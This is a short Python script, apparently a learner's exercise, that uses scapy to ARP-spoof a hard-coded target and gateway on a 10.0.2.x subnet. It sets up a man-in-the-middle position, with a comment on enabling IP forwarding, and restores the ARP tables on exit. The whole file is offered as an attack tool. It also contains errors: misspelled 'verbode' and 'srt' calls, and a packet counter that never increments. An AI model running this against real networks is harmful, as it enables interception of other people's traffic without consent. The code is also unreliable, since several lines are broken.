#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

# Use ARP protocol
def get_mac(ip):
  arp_request = scapy.ARP(pdst=ip)
  brod_cast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_brodcast_request = brod_cast / arp_request
  # answered this is who use this network
  answered = scapy.srp(arp_brodcast_request, timeout=1, verbose=False)[0]
  return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
  target_mac_address = get_mac(target_ip)
  packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip)
  scapy.send(packet, verbode=False)

def restore_connection(destination_ip, source_ip):
  destination_mac_address = get_mac(destination_ip)
  source_mac = get_mac(source_ip)
  packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address, psrc=source_ip, hwsrc=source_mac)
  scapy.send(packet, count=4, verbode=False)


# Man in the middle
# I should allways send a responce to targets
# For the proxy net-requests via middle machine(linux) i should run this command in linux
# echo 1 > /proc/sys/net/ipv4/ip_forward

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

send_packets_count = 0
try:
  while True:
    # send target that i am the router
    spoof(target_ip, gateway_ip)
    # send roter that i am the target
    spoof(gateway_ip, target_ip)

    send_packets_count + 2
    print("\r[+] Send" + srt(send_packets_count) + "pakets", end=""),
    sys.stdout.flush()
    time.sleep(2)
except KeyboardInterrupt:
  print("Quitting ... wait please")
  restore_connection(target_ip, gateway_ip)
  restore_connection(gateway_ip, target_ip)
